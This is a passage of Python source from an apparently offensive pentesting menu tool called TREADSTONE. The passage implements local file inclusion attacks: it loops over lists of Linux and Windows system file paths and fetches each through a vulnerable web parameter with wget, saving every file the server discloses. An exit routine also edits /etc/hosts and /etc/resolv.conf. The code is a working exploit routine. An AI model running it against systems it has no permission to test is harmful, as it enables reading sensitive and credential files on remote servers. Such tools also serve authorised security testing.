# -------------------------------------------------------------------------------------

   if selection == '600':
      checkParams = test_WEB()
      if checkParams != 1:
         print(colored("[*] Using webpage LFI to enumerate files...", colour3))   
         if OSF[:5].upper() != "EMPTY":
            os.chdir(workDir)
            if OSF[:5].upper() == "LINUX":
               file1 = open("../TREADSTONE/linuxlfi.txt", 'r')
               Lines = file1.readlines()
               for line in Lines:
                  file = line.replace("/","-")
                  file = file.replace("\\","-")
                  file = file.replace(" ","_")
                  file = file.rstrip("\n")
                  ffile = "file" + file
                  remoteCOM("wget -q -O " + ffile + " " + WEB + line)
                  if os.stat(ffile).st_size == 0:
                     remoteCOM("rm " + ffile)
                  else:
                     print ("[!] Found file " + WEB + line.rstrip("\n") + "...")
               print("[+] Completed...")
            else:
               file1 = open("../TREADSTONE/windowslfi.txt", 'r')
               Lines = file1.readlines()
               for line in Lines:
                  file = line
                  file = file.replace("C:","")
                  file = file.replace("/","-")
                  file = file.replace("\\","-")
                  file = file.replace(" ","+")
                  file = file.replace("(","-")
                  file = file.replace(")","-")
                  file = file.rstrip("\n")
                  file = "file" + file
                  line = line.replace("C:","")
                  remoteCOM("wget -q -O " + file + " '" + WEB + line.rstrip("\n") + "'")
                  if os.stat(file).st_size == 0:
                     remoteCOM("rm " + file)
                  else:
                     print ("[!] Found file " + WEB + line.rstrip("\n") + "...")
               print("[+] Completed...")
         else:
            print("[-] Unknown operating system...")          
         remoteCOM("cd ..")
      prompt()   
      
# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TREADSTONE                                                             
# Details : Menu option selected - LFI CHECK
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '601':
      checkParams = test_WEB()
      os.chdir(workDir)
      if checkParams != 1:
         print(colored("[*] Using webpage LFI to enumerate files...", colour3))   
         file1 = open("." + currentWordlist.rstrip(" "), 'r')
         Lines = file1.readlines()
         for line in Lines:
            file = line.replace("/","-")
            file = file.replace("\\","-")
            file = file.replace(" ","_")
            file = file.rstrip("\n")
            ffile = "file" + file
            remoteCOM("wget -q -O " + ffile + " " + WEB + line)
            if os.stat(ffile).st_size == 0:
               remoteCOM("rm " + ffile)
            else:
               print ("[!] Found file " + WEB + line.rstrip("\n") + "...")
         print("[+] Completed...")   
         remoteCOM("cd ..")
      prompt()   

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TREADSTONE                                                             
# Details : Menu option selected - Save running config to config.txt and exit program
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '1000':        
      saveParams()
      localCOM("rm *.tmp")      
      if DOMC == 1:
         print("[+] Removing domain name from /etc/hosts...")
         localCOM("sed -i '$d' /etc/hosts")         
      if DNSC == 1:
         print("[+] Removing dns server from /etc/resolv.conf...")
         localCOM("sed -i '$d' /etc/resolv.conf")         
      connection.close()
      print(colored("[*] Program sucessfully terminated...", colour3))
      exit(1)              
      
# Eof...
